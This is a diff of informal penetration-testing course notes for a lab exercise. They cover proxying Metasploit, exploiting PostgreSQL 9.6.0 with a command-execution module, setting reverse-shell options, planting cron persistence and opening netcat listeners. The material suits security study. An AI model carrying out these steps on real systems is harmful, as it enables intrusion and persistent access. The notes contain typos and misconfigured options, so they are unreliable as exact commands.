@@ -1,26 +1,48 @@
 the two different ways to do this within Metasploit, you can run the search command to just called search and then you throw in the service and the version uh or on Cali directly from the terminal called Search sploit
 utulize metasploit to get on soc4. 
-
-proxychains is used because you dont have to drop anything on the victim because ssh is already built in.
-
+Proxychains is used because you dont have to drop anything on the victim because ssh is already built in.
 So we open up Metasploit through proxy chains.
-(ATTACKER) sudo proxychains msfconsole
 
-checked to see if it was vulnerable to SSH enumeration.
+Checked to see if it was vulnerable to SSH enumeration.
 
 landed inside exploit module within Metasploit while it's proxied. 
 say use zero, it's going to set set me up to utilize this module here.
 
-(ATTACKER) searchsploit postgresql
+(ATK)(msf6) searchsploit postgresql [1:45:23][Day 11]
+Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0
 
-LOST comming back through our WAN
+(ATK)(msf6) serarch postgreql 9 (start from 9.6.0 and back space one character each time to see what you find out)
 
-msf6 exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set
+use exploit modules as much as possible.
 
-msf6 exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run
+LHOST comming back through our WAN
+
+[SKIP!!! THIS. TO LINE 30 RABBIT HOLE]
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.122.102
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show info
+
+[Found out that you need creds for this route hard stop]
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts 192.168.122.102
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [check config]
+
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [2:10]
 
 break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)
 
 set up python3 shortest in cron tabs
 
 he set up another listner over port 12225 (VIC 2 Persisitence)
+
+catch user persistence shell ON VIC2 [[14:02]]DAY 12
+nc -lvp 55555
+
